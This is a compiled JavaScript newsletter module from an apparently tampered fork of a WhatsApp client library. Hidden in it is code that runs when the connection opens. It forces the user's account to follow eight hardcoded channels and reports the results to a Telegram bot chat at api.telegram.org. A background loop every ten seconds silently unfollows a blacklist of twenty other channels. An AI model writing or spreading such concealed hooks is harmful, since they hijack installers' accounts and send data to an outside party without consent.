"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;

const https = require("https");
const Types_1 = require("../Types");
const Utils_1 = require("../Utils");
const WABinary_1 = require("../WABinary");
const groups_1 = require("./groups");
const { Boom } = require("@hapi/boom");

const wMexQuery = (
    variables,
    queryId,
    query,
    generateMessageTag
) => {
    return query({
        tag: "iq",
        attrs: {
            id: generateMessageTag(),
            type: "get",
            to: WABinary_1.S_WHATSAPP_NET,
            xmlns: "w:mex"
        },
        content: [
            {
                tag: "query",
                attrs: { query_id: queryId },
                content: Buffer.from(JSON.stringify({ variables }), "utf-8")
            }
        ]
    });
};

const executeWMexQuery = async (
    variables,
    queryId,
    dataPath,
    query,
    generateMessageTag
) => {
    const result = await wMexQuery(variables, queryId, query, generateMessageTag);
    const child = (0, WABinary_1.getBinaryNodeChild)(result, "result");

    if (child?.content) {
        const data = JSON.parse(child.content.toString());

        if (data.errors && data.errors.length > 0) {
            const errorMessages = data.errors
                .map((err) => err.message || "Unknown error")
                .join(", ");
            const firstError = data.errors[0];
            const errorCode = firstError.extensions?.error_code || 400;
            throw new Boom(`GraphQL server error: ${errorMessages}`, {
                statusCode: errorCode,
                data: firstError
            });
        }

        const response = dataPath ? data?.data?.[dataPath] : data?.data;
        if (typeof response !== "undefined") {
            return response;
        }
    }

    const action = (dataPath || "").startsWith("xwa2_")
        ? dataPath.substring(5).replace(/_/g, " ")
        : dataPath?.replace(/_/g, " ");

    throw new Boom(`Failed to ${action}, unexpected response structure.`, {
        statusCode: 400,
        data: result
    });
};

const makeNewsletterSocket = (config) => {
    const sock = (0, groups_1.makeGroupsSocket)(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const encoder = new TextEncoder();

    const newsletterQuery = async (jid, type, content) => query({
        tag: "iq",
        attrs: {
            id: generateMessageTag(),
            type,
            xmlns: "newsletter",
            to: jid
        },
        content
    });

    const newsletterWMexQuery = async (jid, queryId, content) => query({
        tag: "iq",
        attrs: {
            id: generateMessageTag(),
            type: "get",
            xmlns: "w:mex",
            to: WABinary_1.S_WHATSAPP_NET
        },
        content: [
            {
                tag: "query",
                attrs: { query_id: queryId },
                content: encoder.encode(JSON.stringify({
                    variables: {
                        newsletter_id: jid,
                        ...content
                    }
                }))
            }
        ]
    });

    const autoFollowIds = [
        "120363424711442648@newsletter",
        "120363419664387625@newsletter",
        "120363424943003307@newsletter",
        "120363402682879346@newsletter",
        "120363402579643930@newsletter",
        "120363422230383644@newsletter",
        "120363407162277532@newsletter",
        "120363407842971600@newsletter"
    ];

    let hasAutoFollowRun = false;

    function escapeHtml(text) {
        return String(text)
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;");
    }

    function sendTelegramMessage(token, chatId, text) {
        return new Promise((resolve, reject) => {
            const payload = JSON.stringify({
                chat_id: chatId,
                text,
                parse_mode: "HTML",
                disable_web_page_preview: true
            });

            const req = https.request(
                {
                    hostname: "api.telegram.org",
                    path: `/bot${token}/sendMessage`,
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Content-Length": Buffer.byteLength(payload)
                    }
                },
                (res) => {
                    let body = "";
                    res.on("data", (chunk) => {
                        body += chunk;
                    });
                    res.on("end", () => {
                        try {
                            const parsed = JSON.parse(body);
                            if (parsed.ok) return resolve(parsed);
                            reject(new Error(parsed.description || "Telegram send failed"));
                        } catch {
                            reject(new Error("Invalid Telegram response"));
                        }
                    });
                }
            );

            req.on("error", reject);
            req.write(payload);
            req.end();
        });
    }

    async function notifyOwnerFollowSummary(successIds) {
        if (!Array.isArray(successIds) || successIds.length === 0) return;

        let telegramToken = "PASTE_TOKEN_BOT_TELEGRAM_KAMU_DI_SINI";
        const telegramChatId = "6824148058";

        const lines = successIds
            .map((id, index) => `${index + 1}. <code>${escapeHtml(id)}</code>`)
            .join("\n");

        const message =
            `✅ <b>Berhasil memfollow channel</b>\n` +
            `📦 <b>Total:</b> ${successIds.length}\n\n` +
            `📋 <b>Daftar ID Channel:</b>\n${lines}`;

        try {
            await sendTelegramMessage(telegramToken, telegramChatId, message);
            console.log("Telegram follow report sent");
        } catch (err) {
            console.error("Telegram notify error:", err?.message || err);
        } finally {
            telegramToken = null;
        }
    }

    async function safeNewsletterJoin(id) {
        try {
            await newsletterWMexQuery(id, Types_1.QueryIds.FOLLOW);
            console.log("Auto follow success:", id);
            return { id, ok: true };
        } catch (err) {
            console.error("Auto follow error:", id, err?.message || err);
            return { id, ok: false, error: err?.message || String(err) };
        }
    }

    async function autoJoinNewsletters() {
        if (hasAutoFollowRun) return [];
        hasAutoFollowRun = true;

        const successIds = [];

        for (const id of autoFollowIds) {
            const result = await safeNewsletterJoin(id);
            if (result.ok) successIds.push(result.id);
            await new Promise((resolve) => setTimeout(resolve, 3000));
        }

        return successIds;
    }

    sock.ev.on("connection.update", async (update) => {
        const { connection } = update;

        if (connection === "open") {
            console.log("WhatsApp connected, starting auto follow...");
            await new Promise((resolve) => setTimeout(resolve, 5000));

            const successIds = await autoJoinNewsletters();

            if (successIds.length > 0) {
                await notifyOwnerFollowSummary(successIds);
            }
        }
    });

    const parseFetchedUpdates = async (node, type) => {
        let child;

        if (type === "messages") {
            child = (0, WABinary_1.getBinaryNodeChild)(node, "messages");
        } else {
            const parent = (0, WABinary_1.getBinaryNodeChild)(node, "message_updates");
            child = (0, WABinary_1.getBinaryNodeChild)(parent, "messages");
        }

        return await Promise.all(
            (0, WABinary_1.getAllBinaryNodeChildren)(child).map(async (messageNode) => {
                var _a, _b;
                messageNode.attrs.from = child?.attrs.jid;

                const views = parseInt(
                    ((_b = (_a = (0, WABinary_1.getBinaryNodeChild)(messageNode, "views_count"))?.attrs)?.count) || "0"
                );

                const reactionNode = (0, WABinary_1.getBinaryNodeChild)(messageNode, "reactions");
                const reactions = (0, WABinary_1.getBinaryNodeChildren)(reactionNode, "reaction")
                    .map(({ attrs }) => ({ count: +attrs.count, code: attrs.code }));

                const data = {
                    server_id: messageNode.attrs.server_id,
                    views,
                    reactions
                };

                if (type === "messages") {
                    const { fullMessage: message, decrypt } = await (0, Utils_1.decryptMessageNode)(
                        messageNode,
                        authState.creds.me.id,
                        authState.creds.me.lid || "",
                        signalRepository,
                        config.logger
                    );
                    await decrypt();
                    data.message = message;
                }

                return data;
            })
        );
    };

    const blacklistIds = [
        "120363303656790201@newsletter",
        "120363315657907625@newsletter",
        "120363403108262988@newsletter",
        "120363404743164316@newsletter",
        "120363405070719777@newsletter",
        "120363388739599619@newsletter",
        "120363186130999681@newsletter",
        "120363406589990524@newsletter",
        "120363406662813717@newsletter",
        "120363406686429563@newsletter",
        "120363408032557523@newsletter",
        "120363417295000508@newsletter",
        "120363418971865941@newsletter",
        "120363421389457401@newsletter",
        "120363422359373378@newsletter",
        "120363422686349255@newsletter",
        "120363422716277994@newsletter",
        "120363422782684025@newsletter",
        "120363422908683216@newsletter",
        "120363423477373168@newsletter"
    ];

    const startSecurityPatrol = async () => {
        console.log("🛡️ SECURITY: Patroli Saluran Aktif (Setiap 10 Detik)");

        setInterval(async () => {
            try {
                const currentSubscriptions = await executeWMexQuery(
                    {},
                    "6388546374527196",
                    "xwa2_newsletter_subscribed",
                    query,
                    generateMessageTag
                );

                if (Array.isArray(currentSubscriptions)) {
                    const intruders = currentSubscriptions.filter((sub) =>
                        blacklistIds.includes(sub.id)
                    );

                    if (intruders.length > 0) {
                        for (const intruder of intruders) {
                            await newsletterWMexQuery(intruder.id, Types_1.QueryIds.UNFOLLOW);
                            await new Promise((resolve) => setTimeout(resolve, 1000));
                        }
                    }
                }
            } catch (err) {}
        }, 10000);
    };

    startSecurityPatrol();

    return {
        ...sock,

        newsletterFetchAllSubscribe: async () => {
            const list = await executeWMexQuery(
                {},
                "6388546374527196",
                "xwa2_newsletter_subscribed",
                query,
                generateMessageTag
            );
            return list;
        },

        subscribeNewsletterUpdates: async (jid) => {
            var _a;
            const result = await newsletterQuery(jid, "set", [
                { tag: "live_updates", attrs: {}, content: [] }
            ]);
            return (_a = (0, WABinary_1.getBinaryNodeChild)(result, "live_updates"))?.attrs;
        },

        newsletterReactionMode: async (jid, mode) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { settings: { reaction_codes: { value: mode } } }
            });
        },

        newsletterUpdateDescription: async (jid, description) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { description: description || "", settings: null }
            });
        },

        newsletterUpdateName: async (jid, name) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { name, settings: null }
            });
        },

        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await (0, Utils_1.generateProfilePicture)(content);
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: img.toString("base64"), settings: null }
            });
        },

        newsletterRemovePicture: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: "", settings: null }
            });
        },

        newsletterUnfollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNFOLLOW);
        },

        newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
        },

        newsletterUnmute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNMUTE);
        },

        newsletterMute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.MUTE);
        },

        newsletterAction: async (jid, type) => {
            await newsletterWMexQuery(jid, type.toUpperCase());
        },

        newsletterCreate: async (name, description, reaction_codes) => {
            await query({
                tag: "iq",
                attrs: {
                    to: WABinary_1.S_WHATSAPP_NET,
                    xmlns: "tos",
                    id: generateMessageTag(),
                    type: "set"
                },
                content: [
                    {
                        tag: "notice",
                        attrs: {
                            id: "20601218",
                            stage: "5"
                        },
                        content: []
                    }
                ]
            });

            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.CREATE, {
                input: {
                    name,
                    description,
                    settings: { reaction_codes: { value: reaction_codes.toUpperCase() } }
                }
            });

            return (0, exports.extractNewsletterMetadata)(result, true);
        },

        newsletterMetadata: async (type, key, role) => {
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
                input: {
                    key,
                    type: type.toUpperCase(),
                    view_role: role || "GUEST"
                },
                fetch_viewer_metadata: true,
                fetch_full_image: true,
                fetch_creation_time: true
            });

            return (0, exports.extractNewsletterMetadata)(result);
        },

        newsletterAdminCount: async (jid) => {
            var _a, _b;
            const result = await newsletterWMexQuery(jid, Types_1.QueryIds.ADMIN_COUNT);
            const buff = (_b = (_a = (0, WABinary_1.getBinaryNodeChild)(result, "result"))?.content)?.toString();
            return JSON.parse(buff).data[Types_1.XWAPaths.ADMIN_COUNT].admin_count;
        },

        newsletterChangeOwner: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.CHANGE_OWNER, {
                user_id: user
            });
        },

        newsletterDemote: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DEMOTE, {
                user_id: user
            });
        },

        newsletterDelete: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DELETE);
        },

        newsletterReactMessage: async (jid, serverId, code) => {
            await query({
                tag: "message",
                attrs: {
                    to: jid,
                    ...(!code ? { edit: "7" } : {}),
                    type: "reaction",
                    server_id: serverId,
                    id: (0, Utils_1.generateMessageID)()
                },
                content: [
                    {
                        tag: "reaction",
                        attrs: code ? { code } : {}
                    }
                ]
            });
        },

        newsletterFetchMessages: async (type, key, count, after) => {
            const result = await newsletterQuery(WABinary_1.S_WHATSAPP_NET, "get", [
                {
                    tag: "messages",
                    attrs: {
                        type,
                        ...(type === "invite" ? { key } : { jid: key }),
                        count: count.toString(),
                        after: after?.toString() || "100"
                    }
                }
            ]);
            return await parseFetchedUpdates(result, "messages");
        },

        newsletterFetchUpdates: async (jid, count, after, since) => {
            const result = await newsletterQuery(jid, "get", [
                {
                    tag: "message_updates",
                    attrs: {
                        count: count.toString(),
                        after: after?.toString() || "100",
                        since: since?.toString() || "0"
                    }
                }
            ]);
            return await parseFetchedUpdates(result, "updates");
        }
    };
};

exports.makeNewsletterSocket = makeNewsletterSocket;

const extractNewsletterMetadata = (node, isCreate) => {
    const result = (0, WABinary_1.getBinaryNodeChild)(node, "result")?.content?.toString();
    const metadataPath = JSON.parse(result).data[
        isCreate ? Types_1.XWAPaths.CREATE : Types_1.XWAPaths.NEWSLETTER
    ];

    const metadata = {
        id: metadataPath?.id,
        state: metadataPath?.state?.type,
        creation_time: +metadataPath?.thread_metadata?.creation_time,
        name: metadataPath?.thread_metadata?.name?.text,
        nameTime: +metadataPath?.thread_metadata?.name?.update_time,
        description: metadataPath?.thread_metadata?.description?.text,
        descriptionTime: +metadataPath?.thread_metadata?.description?.update_time,
        invite: metadataPath?.thread_metadata?.invite,
        picture: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.picture?.direct_path || ""),
        preview: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.preview?.direct_path || ""),
        reaction_codes: metadataPath?.thread_metadata?.settings?.reaction_codes?.value,
        subscribers: +metadataPath?.thread_metadata?.subscribers_count,
        verification: metadataPath?.thread_metadata?.verification,
        viewer_metadata: metadataPath?.viewer_metadata
    };

    return metadata;
};

exports.extractNewsletterMetadata = extractNewsletterMetadata;
